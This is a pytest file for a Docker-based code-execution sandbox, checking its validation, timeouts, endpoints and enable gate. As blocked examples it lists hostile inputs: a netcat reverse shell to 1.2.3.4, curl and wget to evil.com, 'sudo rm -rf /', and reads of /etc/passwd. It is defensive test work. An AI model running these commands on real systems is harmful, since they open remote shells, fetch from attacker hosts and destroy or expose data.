"""Tests para el sandbox de ejecución de código.

Cubre:
- execute_python con código simple (mockeando Docker)
- Bloqueo de código peligroso (patterns pre-ejecución)
- Timeout enforcement
- Endpoint de status del sandbox
- Rate limiting (10/min)
- Gate CODE_EXECUTION_ENABLED=false
"""
from __future__ import annotations

import json
import os
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

# Configurar entorno de test ANTES de importar la app
os.environ["CODE_EXECUTION_ENABLED"] = "true"

from app.tests.conftest import seed_cliente
from app.settings import settings

settings.code_execution_enabled = True


# ─── Fixtures ──────────────────────────────────────────

@pytest.fixture(autouse=True)
def _reset_settings():
    """Restaura code_execution_enabled tras cada test."""
    yield
    settings.code_execution_enabled = True


def _login_and_get_headers(client: TestClient, db_session: Session) -> dict:
    """Helper: login y devuelve headers JWT."""
    seed_cliente(db_session)
    resp = client.post(
        "/v1/auth/login",
        json={
            "cedula": "1234567890",
            "password": "test123",
        },
    )
    assert resp.status_code == 200, f"Login falló: {resp.status_code} {resp.text}"
    token = resp.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


# ─── Tests de validación de código (sin Docker) ────────

class TestCodeValidation:
    """Validación pre-Docker — no requiere Docker."""

    def test_blocks_dangerous_python_imports(self):
        from app.services.code_execution_service import (
            CodeSecurityError,
            get_code_execution_service,
        )
        svc = get_code_execution_service()

        dangerous = [
            "import os\nprint('hi')",
            "from os import path\nprint(path)",
            "import subprocess\nsubprocess.run('ls')",
            "import sys\nsys.exit()",
            "import ctypes\nctypes.CDLL('libc.so.6')",
            "import socket\ns = socket.socket()",
            "from shutil import copy\ncopy('a','b')",
        ]
        for code in dangerous:
            with pytest.raises(CodeSecurityError):
                svc._validate_code(code, "python")

    def test_blocks_dangerous_python_calls(self):
        from app.services.code_execution_service import (
            CodeSecurityError,
            get_code_execution_service,
        )
        svc = get_code_execution_service()

        dangerous = [
            "eval('1+1')",
            "exec('x=1')",
            "open('/etc/passwd')",
            "__import__('os')",
        ]
        for code in dangerous:
            with pytest.raises(CodeSecurityError):
                svc._validate_code(code, "python")

    def test_blocks_dangerous_js_patterns(self):
        from app.services.code_execution_service import (
            CodeSecurityError,
            get_code_execution_service,
        )
        svc = get_code_execution_service()

        dangerous = [
            "require('child_process').exec('ls')",
            'require("child_process").exec("ls")',
            "require('fs').readFileSync('/etc/passwd')",
            "process.exit(1)",
        ]
        for code in dangerous:
            with pytest.raises(CodeSecurityError):
                svc._validate_code(code, "javascript")

    def test_blocks_code_too_long(self):
        from app.services.code_execution_service import (
            CodeSecurityError,
            get_code_execution_service,
            MAX_CODE_LENGTH,
        )
        svc = get_code_execution_service()

        long_code = "x = " + "1 + " * (MAX_CODE_LENGTH // 3) + "0"
        with pytest.raises(CodeSecurityError):
            svc._validate_code(long_code, "python")

    def test_allows_safe_python(self):
        from app.services.code_execution_service import get_code_execution_service
        svc = get_code_execution_service()

        safe = [
            "x = 1 + 2\nprint(x)",
            "result = sum(range(100))\nprint(result)",
            "for i in range(5):\n    print(i)",
            "import json\ndata = {'key': 'value'}\nprint(json.dumps(data))",
            "import math\nprint(math.sqrt(16))",
            "from collections import Counter\nc = Counter('hello')\nprint(c)",
        ]
        for code in safe:
            try:
                svc._validate_code(code, "python")
            except Exception as e:
                pytest.fail(f"Código seguro bloqueado: {code[:50]}... => {e}")

    def test_allows_safe_js(self):
        from app.services.code_execution_service import get_code_execution_service
        svc = get_code_execution_service()

        safe = [
            "console.log('hello')",
            "const x = 1 + 2;\nconsole.log(x);",
            "const arr = [1,2,3];\nconsole.log(arr.reduce((a,b) => a+b, 0));",
        ]
        for code in safe:
            try:
                svc._validate_code(code, "javascript")
            except Exception as e:
                pytest.fail(f"JS seguro bloqueado: {code[:50]}... => {e}")


# ─── Tests de ejecución mockeada ───────────────────────

class TestMockedExecution:
    """Ejecución mockeada de Docker — no requiere Docker."""

    def test_execute_python_mocked(self):
        """Ejecuta Python con Docker mockeado."""
        from app.services.code_execution_service import (
            ExecutionResult,
            get_code_execution_service,
        )

        svc = get_code_execution_service()
        svc._docker_available = True

        mock_result = subprocess_run_result(stdout=json.dumps({
            "stdout": "hello\n",
            "stderr": "",
            "exit_code": 0,
        }), returncode=0)

        with patch("subprocess.run", return_value=mock_result):
            result = svc.execute_python("print('hello')")
            assert isinstance(result, ExecutionResult)
            assert result.stdout == "hello\n"
            assert result.exit_code == 0

    def test_execute_javascript_mocked(self):
        from app.services.code_execution_service import (
            ExecutionResult,
            get_code_execution_service,
        )

        svc = get_code_execution_service()
        svc._docker_available = True

        mock_result = subprocess_run_result(stdout=json.dumps({
            "stdout": "42\n",
            "stderr": "",
            "exit_code": 0,
        }), returncode=0)

        with patch("subprocess.run", return_value=mock_result):
            result = svc.execute_javascript("console.log(42)")
            assert isinstance(result, ExecutionResult)
            assert result.stdout == "42\n"
            assert result.exit_code == 0

    def test_execute_shell_mocked(self):
        from app.services.code_execution_service import (
            ExecutionResult,
            get_code_execution_service,
        )

        svc = get_code_execution_service()
        svc._docker_available = True

        mock_result = subprocess_run_result(stdout="file1.txt\nfile2.txt\n", returncode=0)

        with patch("subprocess.run", return_value=mock_result):
            result = svc.execute_shell("ls -1")
            assert isinstance(result, ExecutionResult)
            assert "file1.txt" in result.stdout
            assert result.exit_code == 0

    def test_timeout_handling(self):
        import subprocess as sp

        from app.services.code_execution_service import (
            get_code_execution_service,
        )

        svc = get_code_execution_service()
        svc._docker_available = True

        with patch("subprocess.run", side_effect=sp.TimeoutExpired("docker", 5)):
            result = svc.execute_python("while True: pass", timeout_sec=1)
            assert result.exit_code == 124
            assert "Timeout" in result.stderr

    def test_sandbox_unavailable_raises(self):
        from app.services.code_execution_service import (
            SandboxUnavailableError,
            get_code_execution_service,
        )

        svc = get_code_execution_service()
        svc._docker_available = False

        with pytest.raises(SandboxUnavailableError):
            svc.execute_python("print('test')")

    def test_shell_dangerous_commands_blocked(self):
        from app.services.code_execution_service import (
            CodeSecurityError,
            get_code_execution_service,
        )

        svc = get_code_execution_service()
        svc._docker_available = True

        dangerous = [
            "curl http://evil.com",
            "wget http://evil.com",
            "nc -e /bin/sh 1.2.3.4 4444",
            "ssh user@host",
            "mount /dev/sda1 /mnt",
            "sudo rm -rf /",
            "docker ps",
            "kubectl get pods",
        ]
        for cmd in dangerous:
            with pytest.raises(CodeSecurityError):
                svc.execute_shell(cmd)

    def test_shell_safe_commands_allowed(self):
        from app.services.code_execution_service import get_code_execution_service

        svc = get_code_execution_service()
        svc._docker_available = True

        safe = ["ls -la", "echo hello", "cat /etc/hostname 2>/dev/null || true"]

        mock_result = subprocess_run_result(stdout="output\n", returncode=0)
        with patch("subprocess.run", return_value=mock_result):
            for cmd in safe:
                try:
                    svc.execute_shell(cmd)
                except Exception as e:
                    pytest.fail(f"Comando seguro bloqueado: '{cmd}' => {e}")


# ─── Tests de endpoints REST ───────────────────────────

class TestRestEndpoints:
    """Tests de los endpoints REST del sandbox."""

    def test_status_endpoint_available(self, client: TestClient, db_session: Session):
        """GET /v1/code/status con sandbox disponible (mockeado)."""
        from app.services.code_execution_service import get_code_execution_service

        svc = get_code_execution_service()
        svc._docker_available = True

        headers = _login_and_get_headers(client, db_session)
        resp = client.get("/v1/code/status", headers=headers)
        assert resp.status_code == 200
        data = resp.json()
        assert data["available"] is True
        assert "dot-sandbox:latest" in data["image"]

    def test_status_endpoint_unavailable(self, client: TestClient, db_session: Session):
        """GET /v1/code/status con sandbox no disponible."""
        from app.services.code_execution_service import get_code_execution_service

        svc = get_code_execution_service()
        svc._docker_available = False

        headers = _login_and_get_headers(client, db_session)
        resp = client.get("/v1/code/status", headers=headers)
        assert resp.status_code == 200
        data = resp.json()
        assert data["available"] is False

    def test_status_requires_auth(self, client: TestClient):
        """GET /v1/code/status sin JWT debe fallar."""
        resp = client.get("/v1/code/status")
        assert resp.status_code in (401, 403)

    def test_execute_endpoint_mocked(self, client: TestClient, db_session: Session):
        """POST /v1/code/execute con Docker mockeado."""
        from app.services.code_execution_service import get_code_execution_service

        svc = get_code_execution_service()
        svc._docker_available = True

        headers = _login_and_get_headers(client, db_session)
        mock_stdout = json.dumps({"stdout": "42\n", "stderr": "", "exit_code": 0})

        with patch("subprocess.run", return_value=subprocess_run_result(
            stdout=mock_stdout, returncode=0,
        )):
            resp = client.post(
                "/v1/code/execute",
                json={"language": "python", "code": "print(42)", "timeout": 30},
                headers=headers,
            )
        assert resp.status_code == 200
        data = resp.json()
        assert data["stdout"] == "42\n"
        assert data["exit_code"] == 0
        assert "sandbox_id" in data

    def test_execute_rejects_dangerous_code(self, client: TestClient, db_session: Session):
        """POST /v1/code/execute con código peligroso debe devolver 400."""
        from app.services.code_execution_service import get_code_execution_service

        svc = get_code_execution_service()
        svc._docker_available = True

        headers = _login_and_get_headers(client, db_session)
        resp = client.post(
            "/v1/code/execute",
            json={"language": "python", "code": "import os\nos.system('rm -rf /')"},
            headers=headers,
        )
        assert resp.status_code == 400

    def test_execute_rejects_invalid_language(self, client: TestClient, db_session: Session):
        """POST /v1/code/execute con lenguaje inválido."""
        headers = _login_and_get_headers(client, db_session)
        resp = client.post(
            "/v1/code/execute",
            json={"language": "ruby", "code": "puts 'hi'"},
            headers=headers,
        )
        assert resp.status_code == 422

    def test_execute_rejects_empty_code(self, client: TestClient, db_session: Session):
        """POST /v1/code/execute con código vacío."""
        headers = _login_and_get_headers(client, db_session)
        resp = client.post(
            "/v1/code/execute",
            json={"language": "python", "code": ""},
            headers=headers,
        )
        assert resp.status_code == 422

    def test_gate_disabled(self, client: TestClient, db_session: Session):
        """CODE_EXECUTION_ENABLED=false debe devolver 503."""
        settings.code_execution_enabled = False

        headers = _login_and_get_headers(client, db_session)
        resp = client.get("/v1/code/status", headers=headers)
        assert resp.status_code == 503

        # Re-login para execute también
        resp = client.post(
            "/v1/code/execute",
            json={"language": "python", "code": "print('hi')"},
            headers=headers,
        )
        assert resp.status_code == 503

    def test_sandbox_unavailable_in_endpoint(self, client: TestClient, db_session: Session):
        """POST /v1/code/execute con sandbox no disponible devuelve 503."""
        from app.services.code_execution_service import get_code_execution_service

        svc = get_code_execution_service()
        svc._docker_available = False

        headers = _login_and_get_headers(client, db_session)
        resp = client.post(
            "/v1/code/execute",
            json={"language": "python", "code": "print('hi')", "timeout": 10},
            headers=headers,
        )
        assert resp.status_code == 503

    def test_is_available_checks_docker(self):
        """Verifica que is_available detecta Docker correctamente."""
        from app.services.code_execution_service import get_code_execution_service

        svc = get_code_execution_service()
        svc._docker_available = None

        mock_info = subprocess_run_result(returncode=0)
        mock_inspect = subprocess_run_result(returncode=0)

        with patch("subprocess.run", side_effect=[mock_info, mock_inspect]):
            result = svc.is_available()
            assert result is True

    def test_is_available_no_docker(self):
        from app.services.code_execution_service import get_code_execution_service

        svc = get_code_execution_service()
        svc._docker_available = None

        with patch("subprocess.run", side_effect=FileNotFoundError):
            result = svc.is_available()
            assert result is False


# ─── Helpers ───────────────────────────────────────────

def subprocess_run_result(
    stdout: str = "",
    stderr: str = "",
    returncode: int = 0,
) -> MagicMock:
    """Crea un mock de subprocess.CompletedProcess."""
    result = MagicMock()
    result.stdout = stdout
    result.stderr = stderr
    result.returncode = returncode
    return result
